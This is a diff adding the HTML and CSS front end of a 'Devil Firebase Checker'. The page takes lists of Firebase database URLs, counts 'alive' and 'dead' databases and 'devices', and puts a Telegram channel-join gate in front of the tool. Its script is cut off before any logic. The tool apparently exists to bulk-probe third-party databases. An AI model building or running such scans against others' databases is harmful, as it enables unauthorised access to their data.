@@ -1,0 +1,1210 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.5, user-scalable=yes">
+  <title>NXT · Devil Firebase Checker</title>
+  <style>
+    *{margin:0;padding:0;box-sizing:border-box}
+    :root{
+      --bg:#f4f6fa;--surface:#ffffff;--border:#e2e8f0;--text:#0f172a;--sub:#64748b;
+      --dim:#94a3b8;--b:#3b82f6;--g:#22c55e;--r:#ef4444;--y:#eab308;--p:#8b5cf6;
+      --dead:#94a3b8;--shadow:0 10px 30px rgba(0,0,0,.06);--radius:20px;
+      --transition:all .2s ease;
+    }
+    body.dark{
+      --bg:#0b1120;--surface:#1e293b;--border:#334155;--text:#f1f5f9;--sub:#94a3b8;
+      --dim:#64748b;--dead:#6b7280;--shadow:0 20px 40px rgba(0,0,0,.5);
+    }
+    body{
+      background:var(--bg);color:var(--text);
+      font-family:system-ui,-apple-system,'Segoe UI',Roboto,sans-serif;
+      min-height:100vh;display:flex;align-items:center;justify-content:center;
+      padding:16px;transition:background .3s,color .3s;
+    }
+    ::-webkit-scrollbar{width:5px;height:5px}
+    ::-webkit-scrollbar-thumb{background:var(--dim);border-radius:10px}
+
+    .box{
+      background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);
+      padding:28px 24px;max-width:680px;width:100%;box-shadow:var(--shadow);
+      transition:background .3s,border .3s,box-shadow .3s;
+    }
+
+    /* ---- Theme Toggle ---- */
+    .top-bar{display:flex;justify-content:space-between;align-items:center;margin-bottom:6px}
+    .theme-btn{
+      background:var(--bg);border:1px solid var(--border);border-radius:50px;
+      width:44px;height:44px;display:flex;align-items:center;justify-content:center;
+      cursor:pointer;transition:var(--transition);color:var(--sub);flex-shrink:0;
+    }
+    .theme-btn:hover{background:var(--border);color:var(--text)}
+    .theme-btn svg{width:20px;height:20px;transition:transform .3s}
+    .theme-btn:active svg{transform:rotate(30deg)}
+
+    .title{
+      font-size:26px;font-weight:800;letter-spacing:-.5px;
+      background:linear-gradient(135deg,var(--b),var(--p));
+      -webkit-background-clip:text;-webkit-text-fill-color:transparent;
+      display:flex;align-items:center;gap:8px;
+    }
+    .title svg{width:26px;height:26px;color:var(--b);-webkit-text-fill-color:initial;flex-shrink:0}
+    .sub{font-size:13px;color:var(--sub);margin-bottom:20px;font-weight:500}
+
+    /* ---- Telegram Gate ---- */
+    .gate-overlay{
+      position:fixed;inset:0;background:rgba(0,0,0,.65);backdrop-filter:blur(6px);
+      z-index:10000;display:none;align-items:center;justify-content:center;padding:20px;
+    }
+    .gate-overlay.show{display:flex;animation:fadeIn .25s ease}
+    @keyframes fadeIn{from{opacity:0}to{opacity:1}}
+    .gate-box{
+      background:var(--surface);border:1px solid var(--border);border-radius:24px;
+      padding:28px 26px;max-width:440px;width:100%;box-shadow:var(--shadow);
+      text-align:center;
+    }
+    .gate-box h2{font-size:20px;font-weight:800;margin-bottom:6px}
+    .gate-box p{font-size:13px;color:var(--sub);margin-bottom:18px;font-weight:500}
+    .gate-step{
+      display:flex;align-items:center;gap:12px;padding:12px 16px;
+      border:1px solid var(--border);border-radius:14px;margin-bottom:8px;
+      background:var(--bg);transition:var(--transition);cursor:pointer;text-align:left;
+    }
+    .gate-step:hover{border-color:var(--b);background:rgba(59,130,246,.06)}
+    .gate-step.done{border-color:var(--g);background:rgba(34,197,94,.06);cursor:default}
+    .gate-step.done:hover{border-color:var(--g)}
+    .gate-step .step-icon{width:36px;height:36px;border-radius:10px;background:var(--surface);border:1px solid var(--border);display:flex;align-items:center;justify-content:center;flex-shrink:0;font-size:13px;font-weight:800;color:var(--sub)}
+    .gate-step.done .step-icon{background:var(--g);border-color:var(--g);color:#fff}
+    .gate-step .step-text{flex:1;min-width:0}
+    .gate-step .step-text .st-title{font-size:13px;font-weight:700}
+    .gate-step .step-text .st-sub{font-size:11px;color:var(--sub);font-weight:500;margin-top:2px}
+    .gate-step .step-action{font-size:11px;font-weight:700;color:var(--b);white-space:nowrap;flex-shrink:0}
+    .gate-step.done .step-action{color:var(--g)}
+
+    .verify-btn{
+      width:100%;padding:14px;border-radius:14px;border:none;
+      background:linear-gradient(135deg,var(--b),var(--p));color:#fff;
+      font-size:15px;font-weight:800;cursor:pointer;transition:var(--transition);
+      margin-top:14px;display:flex;align-items:center;justify-content:center;gap:8px;
+    }
+    .verify-btn:disabled{opacity:.4;cursor:not-allowed}
+    .verify-btn:not(:disabled):hover{filter:brightness(1.1);transform:translateY(-1px)}
+    .verify-btn svg{width:18px;height:18px}
+
+    .gate-timer{font-size:12px;color:var(--sub);font-weight:600;margin-top:8px;min-height:16px}
+    .gate-timer.wait{color:var(--y)}
+    .gate-timer.ready{color:var(--g)}
+
+    /* ---- Upload ---- */
+    .label-row{display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;flex-wrap:wrap;gap:6px}
+    .label{font-size:11px;font-weight:700;color:var(--sub);text-transform:uppercase;letter-spacing:.5px;display:flex;align-items:center;gap:4px}
+    .label svg{width:14px;height:14px}
+    .upload-actions{display:flex;gap:6px;flex-wrap:wrap}
+    .upload-btn{
+      background:var(--bg);border:1px solid var(--border);color:var(--sub);
+      padding:7px 14px;border-radius:10px;font-size:11px;font-weight:700;
+      cursor:pointer;transition:var(--transition);display:inline-flex;align-items:center;gap:5px;
+    }
+    .upload-btn:hover{border-color:var(--b);color:var(--b);background:rgba(59,130,246,.06)}
+    .upload-btn svg{width:14px;height:14px}
+
+    .file-list{display:none;background:var(--bg);border:1px solid var(--border);border-radius:12px;padding:10px 12px;margin-bottom:10px;max-height:160px;overflow-y:auto}
+    .file-list.show{display:block}
+    .file-list-header{display:flex;justify-content:space-between;align-items:center;font-size:11px;font-weight:800;color:var(--sub);text-transform:uppercase;letter-spacing:.5px;margin-bottom:8px;position:sticky;top:0;background:var(--bg);padding-bottom:6px}
+    .file-list-header .clear-files{color:var(--r);cursor:pointer;text-transform:none;letter-spacing:0;font-weight:700}
+    .file-item{display:flex;align-items:center;gap:8px;padding:6px 8px;background:var(--surface);border:1px solid var(--border);border-radius:8px;margin-bottom:4px;font-size:12px}
+    .file-item:last-child{margin-bottom:0}
+    .file-item .file-icon{flex-shrink:0;display:flex;align-items:center;justify-content:center}
+    .file-item .file-icon svg{width:16px;height:16px;color:var(--b)}
+    .file-item .file-info{flex:1;min-width:0;display:flex;flex-direction:column;gap:2px}
+    .file-item .file-name{font-weight:700;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+    .file-item .file-size{font-size:10px;color:var(--dim);font-weight:600}
+    .file-item .file-status{font-size:10px;font-weight:800;padding:2px 8px;border-radius:6px;flex-shrink:0}
+    .file-item .file-status.loaded{background:rgba(34,197,94,.12);color:var(--g)}
+    .file-item .file-status.error{background:rgba(239,68,68,.12);color:var(--r)}
+    .file-item .remove-file{background:transparent;border:none;color:var(--dim);font-size:16px;cursor:pointer;padding:2px 6px;border-radius:4px;transition:var(--transition);flex-shrink:0}
+    .file-item .remove-file:hover{background:rgba(239,68,68,.12);color:var(--r)}
+
+    /* ---- Textarea ---- */
+    .textarea-wrap{position:relative}
+    .textarea{
+      width:100%;min-height:140px;max-height:320px;background:var(--bg);
+      border:1px solid var(--border);border-radius:14px;padding:14px 16px;
+      font-size:13px;color:var(--text);outline:none;
+      font-family:ui-monospace,SFMono-Regular,Menlo,monospace;
+      transition:var(--transition);resize:vertical;line-height:1.6;
+    }
+    .textarea:focus{border-color:var(--b);box-shadow:0 0 0 3px rgba(59,130,246,.12)}
+    .textarea::placeholder{color:var(--dim)}
+    .hint{font-size:11px;color:var(--dim);margin-top:6px;font-weight:500;line-height:1.5}
+
+    .count-info{display:flex;justify-content:space-between;align-items:center;margin-top:8px;font-size:12px;color:var(--sub);font-weight:600;flex-wrap:wrap;gap:6px}
+    .count-info .num{color:var(--b);font-weight:800}
+    .count-info .invalid-count{color:var(--r);font-weight:700}
+    .count-info .dup-count{color:var(--y);font-weight:700}
+
+    /* ---- Buttons ---- */
+    .btn{
+      width:100%;background:linear-gradient(135deg,var(--b),var(--p));color:#fff;border:none;
+      padding:14px;border-radius:14px;font-size:15px;font-weight:700;cursor:pointer;
+      transition:var(--transition);margin-top:16px;display:flex;align-items:center;justify-content:center;gap:8px;
+    }
+    .btn:hover:not(:disabled){filter:brightness(1.08);transform:translateY(-1px)}
+    .btn:disabled{opacity:.5;cursor:not-allowed;transform:none}
+    .btn svg{width:18px;height:18px}
+
+    .refresh-btn{
+      background:transparent;border:1px solid var(--border);color:var(--sub);
+      padding:11px;border-radius:14px;font-size:14px;font-weight:600;cursor:pointer;
+      width:100%;margin-top:8px;transition:var(--transition);display:none;
+    }
+    .refresh-btn.show{display:block}
+    .refresh-btn:hover{background:var(--bg);color:var(--text);border-color:var(--dim)}
+
+    /* ---- Progress ---- */
+    .progress-wrap{margin-top:14px;display:none}
+    .progress-wrap.show{display:block}
+    .progress-bar{width:100%;height:6px;background:var(--bg);border-radius:10px;overflow:hidden;border:1px solid var(--border)}
+    .progress-fill{height:100%;background:linear-gradient(90deg,var(--b),var(--p));border-radius:10px;transition:width .2s ease;width:0%}
+    .progress-info{display:flex;justify-content:space-between;margin-top:6px;font-size:12px;color:var(--sub);font-weight:600}
+    .progress-info .pct{color:var(--b);font-weight:800}
+
+    /* ---- Live Counter ---- */
+    .live-counter{display:none;background:var(--bg);border:1px solid var(--border);border-radius:14px;padding:14px;margin-top:14px;margin-bottom:10px}
+    .live-counter.show{display:block}
+    .live-counter-title{font-size:10px;font-weight:800;color:var(--sub);text-transform:uppercase;letter-spacing:.8px;text-align:center;margin-bottom:10px;display:flex;align-items:center;justify-content:center;gap:6px}
+    .live-counter-title svg{width:14px;height:14px}
+    .live-counter-grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px}
+    .lc-box{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:12px 6px;text-align:center;transition:var(--transition)}
+    .lc-box.all{border-color:rgba(59,130,246,.3)}
+    .lc-box.alive{border-color:rgba(34,197,94,.3)}
+    .lc-box.dead{border-color:rgba(239,68,68,.3)}
+    .lc-box .lc-num{font-size:24px;font-weight:800;line-height:1;font-family:ui-monospace,monospace;transition:color .2s}
+    .lc-box.all .lc-num{color:var(--b)}
+    .lc-box.alive .lc-num{color:var(--g)}
+    .lc-box.dead .lc-num{color:var(--r)}
+    .lc-box .lc-lbl{font-size:9px;color:var(--sub);text-transform:uppercase;letter-spacing:.5px;margin-top:5px;font-weight:800}
+    .lc-box .lc-sub{font-size:10px;color:var(--dim);margin-top:2px;font-weight:600}
+
+    /* ---- Live Status ---- */
+    .live-status{display:none;margin-top:8px;background:var(--bg);border:1px solid var(--border);border-radius:12px;padding:10px 14px;font-size:12px}
+    .live-status.show{display:block}
+    .live-status-row{display:flex;justify-content:space-between;align-items:center;padding:3px 0}
+    .live-status-row .lbl{color:var(--sub);font-weight:700;display:flex;align-items:center;gap:5px}
+    .live-status-row .lbl svg{width:13px;height:13px}
+    .live-status-row .val{font-weight:800;font-family:ui-monospace,monospace}
+    .live-status-row .val.active{color:var(--b)}
+    .live-status-row .val.done{color:var(--g)}
+    .live-status-row .val.fail{color:var(--r)}
+
+    /* ---- Results ---- */
+    .result{margin-top:18px;display:none}
+    .result.show{display:block}
+    .db-list{max-height:500px;overflow-y:auto;padding-right:2px}
+
+    .db-block{background:var(--bg);border:1px solid var(--border);border-radius:14px;padding:12px 14px;margin-bottom:8px;transition:border-color .15s}
+    .db-block:hover{border-color:var(--dim)}
+    .db-block.dead{border-color:rgba(107,114,128,.3);background:rgba(107,114,128,.06)}
+    .db-block.invalid{border-color:rgba(239,68,68,.25);background:rgba(239,68,68,.05)}
+    .db-name{font-size:12px;font-weight:700;color:var(--sub);font-family:ui-monospace,monospace;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;display:flex;align-items:center;gap:6px}
+    .db-name.on{color:var(--g)}
+    .db-name.dead{color:var(--dead)}
+    .db-name.invalid{color:var(--r)}
+    .db-name .db-icon{flex-shrink:0;display:flex;align-items:center}
+    .db-name .db-icon svg{width:14px;height:14px}
+
+    .badge{display:inline-block;font-size:9px;font-weight:800;padding:3px 10px;border-radius:10px;letter-spacing:1px;text-transform:uppercase;flex-shrink:0}
+    .badge.dead{background:rgba(107,114,128,.15);color:var(--dead)}
+    .badge.invalid{background:rgba(239,68,68,.12);color:var(--r)}
+
+    .stats{display:grid;grid-template-columns:1fr 1fr 1fr;gap:5px;margin-top:8px}
+    .stat{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:8px 4px;text-align:center}
+    .stat .num{font-size:16px;font-weight:800;line-height:1}
+    .stat .lbl{font-size:8px;color:var(--sub);text-transform:uppercase;letter-spacing:.5px;margin-top:3px;font-weight:700}
+    .stat.total .num{color:var(--text)}
+    .stat.online .num{color:var(--g)}
+    .stat.offline .num{color:var(--r)}
+
+    .dead-reason{font-size:11px;color:var(--dead);margin-top:6px}
+    .invalid-reason{font-size:11px;color:var(--r);margin-top:6px;font-weight:600}
+
+    .grand-total{
+      background:linear-gradient(135deg,var(--b),var(--p));border-radius:16px;padding:16px;
+      margin-bottom:12px;display:grid;grid-template-columns:1fr 1fr 1fr;gap:6px;
+      position:sticky;top:0;z-index:2;box-shadow:0 8px 24px rgba(59,130,246,.25);
+    }
+    .grand-total .gstat{text-align:center}
+    .grand-total .gstat .gnum{font-size:28px;font-weight:800;line-height:1;color:#fff}
+    .grand-total .gstat .glbl{font-size:9px;color:rgba(255,255,255,.8);text-transform:uppercase;letter-spacing:.5px;margin-top:4px;font-weight:700}
+    .grand-label{text-align:center;font-size:10px;font-weight:700;color:var(--sub);text-transform:uppercase;letter-spacing:1px;margin-bottom:6px}
+
+    .filter-stats{display:grid;grid-template-columns:1fr 1fr 1fr;gap:6px;margin-bottom:10px}
+    .filter-stat{background:var(--bg);border:1px solid var(--border);border-radius:12px;padding:10px 6px;text-align:center;transition:var(--transition);cursor:pointer}
+    .filter-stat.active{border-width:2px;transform:translateY(-1px)}
+    .filter-stat.all.active{border-color:var(--b);background:rgba(59,130,246,.06)}
+    .filter-stat.alive.active{border-color:var(--g);background:rgba(34,197,94,.06)}
+    .filter-stat.dead.active{border-color:var(--r);background:rgba(239,68,68,.06)}
+    .filter-stat .fs-num{font-size:20px;font-weight:800;line-height:1}
+    .filter-stat .fs-lbl{font-size:8px;color:var(--sub);text-transform:uppercase;letter-spacing:.5px;margin-top:4px;font-weight:800}
+    .filter-stat.all .fs-num{color:var(--b)}
+    .filter-stat.alive .fs-num{color:var(--g)}
+    .filter-stat.dead .fs-num{color:var(--r)}
+
+    .summary-line{text-align:center;font-size:12px;margin-bottom:10px;font-weight:600;display:flex;justify-content:center;gap:12px;flex-wrap:wrap}
+    .summary-line .s-alive{color:var(--g)}
+    .summary-line .s-dead{color:var(--dead)}
+    .summary-line .s-invalid{color:var(--r)}
+
+    .error{background:rgba(239,68,68,.08);border:1px solid rgba(239,68,68,.25);color:var(--r);padding:12px 16px;border-radius:12px;font-size:13px;margin-top:12px;font-weight:600}
+
+    /* ---- Controls ---- */
+    .controls{background:var(--bg);border:1px solid var(--border);border-radius:14px;padding:12px 14px;margin-bottom:10px}
+    .control-row{display:flex;flex-direction:column;gap:10px}
+    .control-group{display:flex;flex-direction:column;gap:5px}
+    .control-label{font-size:10px;font-weight:800;color:var(--sub);text-transform:uppercase;letter-spacing:.5px;display:flex;align-items:center;gap:4px}
+    .control-label svg{width:12px;height:12px}
+    .control-options{display:flex;gap:4px;flex-wrap:wrap}
+    .control-options button{flex:1;min-width:55px;padding:7px 5px;border-radius:8px;border:1px solid var(--border);background:transparent;color:var(--sub);font-size:10px;font-weight:700;cursor:pointer;transition:var(--transition);white-space:nowrap}
+    .control-options button:hover{background:var(--surface)}
+    .control-options button.active{background:var(--b);color:#fff;border-color:var(--b)}
+    .control-options button.active.sort-active{background:var(--p);border-color:var(--p)}
+    .control-options button.active.filter-active{background:var(--g);border-color:var(--g);color:#fff}
+
+    .min-input-wrap{display:flex;align-items:center;gap:6px}
+    .min-input{flex:1;background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:8px 12px;font-size:13px;color:var(--text);outline:none;font-family:inherit;font-weight:700;text-align:center}
+    .min-input:focus{border-color:var(--b);box-shadow:0 0 0 3px rgba(59,130,246,.12)}
+    .min-input::placeholder{color:var(--dim)}
+    .min-btn{padding:8px 14px;border-radius:8px;border:1px solid var(--b);background:var(--b);color:#fff;font-size:12px;font-weight:700;cursor:pointer;transition:var(--transition)}
+    .min-btn:hover{filter:brightness(1.1)}
+
+    .result-count{text-align:center;font-size:12px;color:var(--sub);font-weight:600;margin-bottom:8px}
+    .result-count strong{color:var(--b);font-weight:800}
+    .rank-badge{background:rgba(139,92,246,.12);color:var(--p);font-size:9px;font-weight:800;padding:2px 7px;border-radius:8px;margin-right:3px}
+
+    .export-btn{width:100%;background:linear-gradient(135deg,var(--p),var(--b));color:#fff;border:none;padding:12px;border-radius:14px;font-size:13px;font-weight:700;cursor:pointer;transition:var(--transition);margin-bottom:8px;display:flex;align-items:center;justify-content:center;gap:6px}
+    .export-btn:hover{filter:brightness(1.08);transform:translateY(-1px)}
+    .export-btn svg{width:16px;height:16px}
+
+    /* ---- Export Modal ---- */
+    .export-modal{position:fixed;inset:0;background:rgba(0,0,0,.6);backdrop-filter:blur(4px);display:none;align-items:center;justify-content:center;z-index:9999;padding:20px}
+    .export-modal.show{display:flex;animation:fadeIn .2s ease}
+    .export-box{background:var(--surface);border:1px solid var(--border);border-radius:20px;padding:22px;max-width:580px;width:100%;max-height:90vh;display:flex;flex-direction:column;box-shadow:var(--shadow)}
+    .export-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:12px}
+    .export-title{font-size:17px;font-weight:800;background:linear-gradient(135deg,var(--b),var(--p));-webkit-background-clip:text;-webkit-text-fill-color:transparent;display:flex;align-items:center;gap:6px}
+    .export-title svg{width:18px;height:18px;color:var(--b);-webkit-text-fill-color:initial}
+    .export-close{background:transparent;border:none;color:var(--sub);font-size:22px;font-weight:700;cursor:pointer;padding:4px 10px;border-radius:8px;transition:var(--transition);line-height:1}
+    .export-close:hover{background:rgba(239,68,68,.12);color:var(--r)}
+    .export-info{font-size:12px;color:var(--sub);margin-bottom:8px;font-weight:600}
+    .export-info strong{color:var(--b);font-weight:800}
+    .export-textarea{flex:1;min-height:280px;background:var(--bg);border:1px solid var(--border);border-radius:12px;padding:12px 14px;font-size:13px;color:var(--text);outline:none;font-family:ui-monospace,SFMono-Regular,Menlo,monospace;resize:none;line-height:1.6;user-select:all;white-space:pre;overflow:auto}
+    .export-textarea:focus{border-color:var(--b);box-shadow:0 0 0 3px rgba(59,130,246,.12)}
+    .export-actions{display:flex;gap:6px;margin-top:10px;flex-wrap:wrap}
+    .export-actions button{flex:1;min-width:70px;padding:10px;border-radius:12px;font-size:12px;font-weight:700;cursor:pointer;transition:var(--transition);border:1px solid var(--border);background:var(--bg);color:var(--sub);display:flex;align-items:center;justify-content:center;gap:5px}
+    .export-actions button:hover{background:var(--surface);color:var(--text)}
+    .export-actions .copy-all{background:var(--b);color:#fff;border-color:var(--b)}
+    .export-actions .copy-all:hover{filter:brightness(1.1);color:#fff}
+    .export-actions .download-all{background:var(--g);color:#fff;border-color:var(--g)}
+    .export-actions .download-all:hover{filter:brightness(1.1);color:#fff}
+    .export-actions button svg{width:14px;height:14px}
+
+    .drop-overlay{position:absolute;inset:0;background:rgba(59,130,246,.1);border:2px dashed var(--b);border-radius:14px;display:none;align-items:center;justify-content:center;color:var(--b);font-size:14px;font-weight:800;pointer-events:none;z-index:5;flex-direction:column;gap:6px}
+    .textarea-wrap.dragover .drop-overlay{display:flex}
+    .textarea-wrap.dragover .textarea{border-color:var(--b)}
+    .drop-overlay svg{width:32px;height:32px}
+
+    @media(max-width:480px){
+      .box{padding:20px 16px;border-radius:16px}
+      .title{font-size:22px}
+      .title svg{width:22px;height:22px}
+      .grand-total .gstat .gnum{font-size:24px}
+      .stat .num{font-size:14px}
+      .stat .lbl{font-size:7px}
+      .control-options button{font-size:9px;padding:6px 3px;min-width:45px}
+      .export-box{padding:16px}
+      .export-textarea{min-height:180px;font-size:12px}
+      .lc-box .lc-num{font-size:20px}
+      .filter-stat .fs-num{font-size:18px}
+      .gate-box{padding:22px 18px}
+      .theme-btn{width:40px;height:40px}
+    }
+  </style>
+</head>
+<body>
+
+<!-- ========== TELEGRAM GATE ========== -->
+<div class="gate-overlay" id="gateOverlay">
+  <div class="gate-box">
+    <h2>🔐 Verification Required</h2>
+    <p>Please join all channels &amp; group to continue</p>
+    <div id="gateSteps"></div>
+    <button class="verify-btn" id="verifyBtn" disabled>
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+      Verify &amp; Continue
+    </button>
+    <div class="gate-timer" id="gateTimer"></div>
+  </div>
+</div>
+
+<!-- ========== MAIN BOX ========== -->
+<div class="box">
+  <div class="top-bar">
+    <div class="title">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
+      Devil Firebase Checkerr
+    </div>
+    <button class="theme-btn" id="themeToggle" title="Toggle theme">
+      <svg id="themeIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
+    </button>
+  </div>
+  <div class="sub">Unlimited Firebase URLs — fast parallel check</div>
+
+  <div class="label-row">
+    <span class="label">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
+      Firebase URLs
+    </span>
+    <div class="upload-actions">
+      <button class="upload-btn" id="uploadBtn">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="12" y1="18" x2="12" y2="12"/><line x1="9" y1="15" x2="15" y2="15"/></svg>
+        Single
+      </button>
+      <button class="upload-btn" id="uploadMultiBtn">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/><line x1="12" y1="11" x2="12" y2="17"/><line x1="9" y1="14" x2="15" y2="14"/></svg>
+        Multiple
+      </button>
+    </div>
+  </div>
+
+  <div class="file-list" id="fileList">
+    <div class="file-list-header">
+      <span>📂 Loaded (<span id="fileCount">0</span>)</span>
+      <span class="clear-files" onclick="clearAllFiles()">Clear Files</span>
+    </div>
+    <div id="fileItems"></div>
+  </div>
+
+  <div class="textarea-wrap" id="textareaWrap">
+    <textarea class="textarea" id="urlsInput" placeholder="https://project1.firebaseio.com&#10;https://project2.firebasedatabase.app&#10;https://project3.region.firebasedatabase.app&#10;&#10;💡 Upload .txt files or drag & drop" spellcheck="false"></textarea>
+    <div class="drop-overlay">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
+      <div>Drop .txt file(s) here</div>
+    </div>
+  </div>
+  <input type="file" id="fileInput" accept=".txt,text/plain" style="display:none">
+  <input type="file" id="multiFileInput" accept=".txt,text/plain" multiple style="display:none">
+
+  <div class="count-info">
+    <span>
+      ✅ <span class="num" id="validCount">0</span> valid
+      <span id="invalidInfo" style="display:none;"> · <span class="invalid-count"><span id="invalidCount">0</span> invalid</span></span>
+      <span id="dupInfo" style="display:none;"> · <span class="dup-count"><span id="dupCount">0</span> duplicate</span></span>
+    </span>
+    <span id="clearAll" style="cursor:pointer;color:var(--r);font-weight:700;">Clear All</span>
+  </div>
+  <div class="hint">One URL per line. Supports firebaseio.com, firebasedatabase.app &amp; regional links.</div>
+
+  <button class="btn" id="countBtn">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+    Count All Devices
+  </button>
+  <button class="refresh-btn" id="refreshBtn">🔄 Refresh</button>
+  <button class="refresh-btn" id="stopBtn" style="display:none;color:var(--r);border-color:rgba(239,68,68,.3);">⏹ Stop</button>
+
+  <div class="progress-wrap" id="progressWrap">
+    <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+    <div class="progress-info"><span id="progressText">0 / 0</span><span class="pct" id="progressPct">0%</span></div>
+  </div>
+
+  <div class="live-counter" id="liveCounter">
+    <div class="live-counter-title">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+      Live Real-Time Count
+    </div>
+    <div class="live-counter-grid">
+      <div class="lc-box all"><div class="lc-num" id="lcTotal">0</div><div class="lc-lbl">Total</div><div class="lc-sub" id="lcTotalSub">Checked</div></div>
+      <div class="lc-box alive"><div class="lc-num" id="lcAlive">0</div><div class="lc-lbl">Alive</div><div class="lc-sub" id="lcAliveSub">Working</div></div>
+      <div class="lc-box dead"><div class="lc-num" id="lcDead">0</div><div class="lc-lbl">Dead</div><div class="lc-sub" id="lcDeadSub">Failed</div></div>
+    </div>
+  </div>
+
+  <div class="live-status" id="liveStatus">
+    <div class="live-status-row"><span class="lbl"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg> Pending</span><span class="val active" id="lsPending">0</span></div>
+    <div class="live-status-row"><span class="lbl"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg> Speed</span><span class="val active" id="lsSpeed">0/s</span></div>
+  </div>
+
+  <div class="result" id="result"></div>
+  <div id="errorBox"></div>
+</div>
+
+<!-- ========== EXPORT MODAL ========== -->
+<div class="export-modal" id="exportModal">
+  <div class="export-box">
+    <div class="export-header">
+      <div class="export-title">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+        Export Results
+      </div>
+      <button class="export-close" onclick="closeExport()">✕</button>
+    </div>
+    <div class="export-info" id="exportInfo"></div>
+    <textarea class="export-textarea" id="exportText" readonly></textarea>
+    <div class="export-actions">
+      <button class="copy-all" onclick="copyExport()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy All</button>
+      <button class="download-all" onclick="downloadExport()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg> Download</button>
+      <button onclick="closeExport()">Close</button>
+    </div>
+  </div>
+</div>
+
+<script>
+// ============================================================
+// CONFIG
+// ============================================================
